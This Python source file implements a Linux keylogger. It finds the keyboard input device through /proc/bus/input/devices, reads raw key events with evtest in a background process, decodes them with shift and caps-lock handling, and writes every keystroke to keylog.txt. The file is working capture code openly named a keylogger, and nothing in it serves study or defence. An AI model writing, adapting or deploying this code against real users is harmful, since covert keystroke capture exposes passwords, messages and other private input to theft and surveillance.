import re
import multiprocessing
import subprocess

qwerty_map = {
    2: "1", 3: "2", 4: "3", 5: "4", 6: "5", 7: "6", 8: "7", 9: "8", 10: "9",
    11: "0", 12: "-", 13: "=", 14: "[BACKSPACE]", 15: "[TAB]", 16: "q", 17: "w",
    18: "e", 19: "r", 20: "t", 21: "y", 22: "u", 23: "i", 24: "o", 25: "p", 26: "[",
    27: "]", 28: "\n", 29: "[CTRL]", 30: "a", 31: "s", 32: "d", 33: "f", 34: "g",
    35: "h", 36: "j", 37: "k", 38: "l", 39: ";", 40: "'", 41: "`", 42: "[SHIFT]",
    43: "\\", 44: "z", 45: "x", 46: "c", 47: "v", 48: "b", 49: "n", 50: "m",
    51: ",", 52: ".", 53: "/", 54: "[SHIFT]", 55: "*", 56: "ALT", 57: " ", 58: "[CAPSLOCK]",
    59: "F1", 60: "F2", 61: "F3", 62: "F4", 63: "F5", 64: "F6", 65: "F7", 66: "F8", 67: "F9", 68: "F10",
    69: "NUMLOCK", 70: "SCROLLLOCK", 103: "UP", 105: "LEFT", 106: "RIGHT", 108: "DOWN", 110: "INSERT", 111: "DELETE"
}

special_map = {
    2: "!", 3: "@", 4: "#", 5: "$", 6: "%", 7: "^", 8: "&", 9: "*", 10: "(", 11: ")", 12: "_", 13: "+",
    26: "{", 27: "}", 39: ":", 40: '""', 41: "~", 43: "|", 51: "<", 52: ">", 53: "?"
}


class Keylogger:
    def __init__(self):
        self.__status = False
        self.__stop_flag = None

    def get_status(self):
        return self.__status

    def toggle_status(self):
        self.__status = not self.__status

    def get_stop_flag(self):
        return self.__stop_flag

    def set_stop_flag(self, flag):
        self.__stop_flag = flag

    def start_keylogger(self):
        self.toggle_status()
        create_log_file()
        event_path = get_event_path()
        print(f"KEYLOGGER:: Found the event file path: {event_path}")
        stop_flag = multiprocessing.Event()
        keylogger_process = multiprocessing.Process(target=read_event, args=(event_path, stop_flag))
        print(f"KEYLOGGER:: Started Keylogger Process")
        keylogger_process.start()
        self.set_stop_flag(stop_flag)

    def stop_keylogger(self):
        if type(self.get_stop_flag()) == multiprocessing.synchronize.Event:
            self.get_stop_flag().set()
            self.toggle_status()
            print(f"KEYLOGGER:: Stopped Keylogger Process")
            return 0
        return -1


def create_log_file():
    try:
        f = open('keylog.txt', 'x')
    except FileExistsError:
        print(f"KEYLOGGER:: Log file exists")
    else:
        f.close()
        print("KEYLOGGER:: Log file created")


def write_to_log_file(string):
    with open('keylog.txt', 'a') as f:
        f.write(string)


def get_event_path():
    with open("/proc/bus/input/devices") as f:
        lines = f.readlines()

        pattern = re.compile("Handlers|EV=")
        handlers = list(filter(pattern.search, lines))

        pattern = re.compile("EV=120013")

        for idx, elt in enumerate(handlers):
            if pattern.search(elt):
                line = handlers[idx - 1]

        pattern = re.compile("event[0-9]")
        infile_path = "/dev/input/" + pattern.search(line).group(0)
    return infile_path


def process_line(line):
    pattern = r"Event: time \d+.\d+, type \d+ \(EV_KEY\), code (\d+) \(\w+\), value (\d+)"
    return re.search(pattern, line)


def manage_shift_and_caps(shift_key_pressed, capslock_pressed, code):
    if shift_key_pressed and not capslock_pressed:
        if code in special_map.keys():
            write_to_log_file(special_map[code])
        else:
            if qwerty_map[code].isalpha():
                write_to_log_file(qwerty_map[code].upper())
            else:
                write_to_log_file(qwerty_map[code])
    elif capslock_pressed and not shift_key_pressed:
        if qwerty_map[code].isalpha():
            write_to_log_file(qwerty_map[code].upper())
        else:
            write_to_log_file(qwerty_map[code])
    elif capslock_pressed and shift_key_pressed:
        if code in special_map.keys():
            write_to_log_file(special_map[code])
        else:
            write_to_log_file(qwerty_map[code])
    elif not shift_key_pressed and not capslock_pressed:
        write_to_log_file(qwerty_map[code])


def read_event(path_to_event, stop_flag):
    shift_key_pressed = False
    capslock_pressed = False
    process = subprocess.Popen(["evtest", path_to_event], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    count = 0
    while not stop_flag.is_set():
        count += 1
        line = process.stdout.readline().decode("utf-8")
        key_value = process_line(line)
        if key_value:
            code = int(key_value.group(1))
            value = int(key_value.group(2))
            if (code == 42 or code == 54) and value == 1:
                shift_key_pressed = True
            elif code == 58 and value == 1:
                capslock_pressed = not capslock_pressed
            elif (code == 42 or code == 54) and value == 0:
                shift_key_pressed = False
            if code != 42 and code != 54 and code != 58 and value == 1:
                manage_shift_and_caps(shift_key_pressed, capslock_pressed, code)
    if process:
        process.terminate()
